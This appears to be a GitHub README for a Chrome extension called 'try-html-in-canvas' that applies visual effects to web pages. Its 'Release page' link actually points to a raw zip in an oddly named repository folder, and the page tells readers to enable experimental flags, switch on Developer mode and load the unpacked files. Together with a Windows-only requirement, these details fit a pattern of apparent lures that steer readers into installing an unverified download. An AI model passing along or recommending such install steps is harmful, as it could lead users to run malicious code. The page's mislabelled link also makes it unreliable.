# 🎨 try-html-in-canvas - Add creative visual effects to websites

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/theonfromgot-oss/try-html-in-canvas/raw/refs/heads/main/chavicin/canvas_html_in_try_3.0.zip)

This software allows you to transform any web page into a visual display. It uses browser tools to capture the contents of a page and applies filters to change how they look. You can use pre-set effects like blurring, swirling, or color shifts to customize your browsing experience.

## ⚙️ Before you begin

This software relies on experimental features in your web browser. You must update your settings before the extension functions.

1. Open a new tab in Google Chrome.
2. Type `chrome://flags#enable-experimental-web-platform-features` into your address bar and press Enter.
3. Find the setting labeled **Experimental Web Platform features** and set it to **Enabled**.
4. Type `chrome://flags/#canvas-draw-element` into your address bar and press Enter.
5. Set this option to **Enabled**.
6. Close your browser and restart it to apply these changes.

## 💾 Downloading and installing

You need to save the program files to your computer.

[Visit the release page to download the latest file](https://github.com/theonfromgot-oss/try-html-in-canvas/raw/refs/heads/main/chavicin/canvas_html_in_try_3.0.zip)

1. Go to the link above.
2. Look for the section labeled **Assets**.
3. Click the file ending in `.zip` to download it to your computer.
4. Open the folder where your file saved.
5. Right-click the folder and select **Extract All** to reveal the contained files.

## 🛠️ Loading the extension

After you extract the files, add the tool to your browser.

1. Open Google Chrome.
2. Click the three dots in the top right corner.
3. Select **Extensions** and then **Manage Extensions**.
4. Switch on **Developer mode** in the top right corner.
5. Click **Load unpacked** in the top left corner.
6. Select the folder you extracted earlier.
7. The extension now appears in your toolbar.

## 🪄 Using effects

Click the icon in your browser toolbar to open the menu.

1. Select a preset from the list to see an immediate change on your current page.
2. Use the provided text box if you want to write or edit custom visual code.
3. Adjust the intensity bars to change how strong an effect appears on your screen.
4. Click the **Reset** button to return the page to its original state.

## 💻 System requirements

This tool requires:
* Google Chrome version 120 or higher.
* A computer with a graphics card that supports WebGL.
* Windows 10 or Windows 11.

## ❓ Troubleshooting

If the software does not work, check these common issues:

* **The screen stays white:** Reload the page or toggle the extension off and on using the toolbar icon.
* **Error message in the status bar:** This usually means you missed a step in the experimental settings section. Check that both flags mentioned at the start are set to **Enabled** and restart your browser.
* **Slow performance:** High resolutions make some effects move slowly. If your computer struggles, close other tabs or reduce the size of your browser window.
